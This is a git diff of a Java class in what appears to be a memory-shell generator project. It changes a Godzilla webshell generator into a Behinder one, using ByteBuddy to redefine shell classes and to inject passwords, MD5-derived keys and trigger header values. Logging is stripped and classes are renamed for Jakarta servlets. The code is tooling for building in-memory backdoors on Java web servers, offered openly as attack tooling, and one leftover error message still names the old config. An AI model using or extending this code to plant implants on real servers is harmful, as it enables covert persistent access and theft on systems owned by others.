@@ -1,9 +1,9 @@
-package com.reajason.javaweb.memshell;
+package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
-import com.reajason.javaweb.memshell.config.GodzillaConfig;
+import com.reajason.javaweb.memshell.config.BehinderConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
@@ -15,38 +15,35 @@ import org.apache.commons.lang3.StringUtils;
 
 /**
  * @author ReaJason
- * @since 2024/11/23
+ * @since 2024/12/21
  */
-public class GodzillaGenerator {
+public class BehinderGenerator {
     private final ShellConfig shellConfig;
-    private final GodzillaConfig godzillaConfig;
+    private final BehinderConfig behinderConfig;
 
-    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
+    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig behinderConfig) {
         this.shellConfig = shellConfig;
-        this.godzillaConfig = godzillaConfig;
+        this.behinderConfig = behinderConfig;
     }
 
     public DynamicType.Builder<?> getBuilder() {
-        if (godzillaConfig.getShellClass() == null) {
+        if (behinderConfig.getShellClass() == null) {
             throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
         }
-        if (StringUtils.isBlank(godzillaConfig.getKey()) || StringUtils.isBlank(godzillaConfig.getPass())) {
-            throw new IllegalArgumentException("godzillaConfig.getKey().isBlank() || godzillaConfig.getPass().isBlank()");
+        if (StringUtils.isBlank(behinderConfig.getPass())) {
+            throw new IllegalArgumentException("behinderConfig.getPass().isBlank()");
         }
-        String md5Key = DigestUtils.md5Hex(godzillaConfig.getKey()).substring(0, 16);
-        String md5 = DigestUtils.md5Hex(godzillaConfig.getPass() + md5Key).toUpperCase();
+        String md5Key = DigestUtils.md5Hex(behinderConfig.getPass()).substring(0, 16);
 
         DynamicType.Builder<?> builder = new ByteBuddy()
-                .redefine(godzillaConfig.getShellClass())
-                .name(godzillaConfig.getShellClassName())
+                .redefine(behinderConfig.getShellClass())
+                .name(behinderConfig.getShellClassName())
                 .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                 .constructor(ElementMatchers.any())
                 .intercept(SuperMethodCall.INSTANCE
-                        .andThen(FieldAccessor.ofField("pass").setsValue(godzillaConfig.getPass()))
-                        .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
-                        .andThen(FieldAccessor.ofField("md5").setsValue(md5))
-                        .andThen(FieldAccessor.ofField("headerName").setsValue(godzillaConfig.getHeaderName()))
-                        .andThen(FieldAccessor.ofField("headerValue").setsValue(godzillaConfig.getHeaderValue())));
+                        .andThen(FieldAccessor.ofField("pass").setsValue(md5Key))
+                        .andThen(FieldAccessor.ofField("headerName").setsValue(behinderConfig.getHeaderName()))
+                        .andThen(FieldAccessor.ofField("headerValue").setsValue(behinderConfig.getHeaderValue())));
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
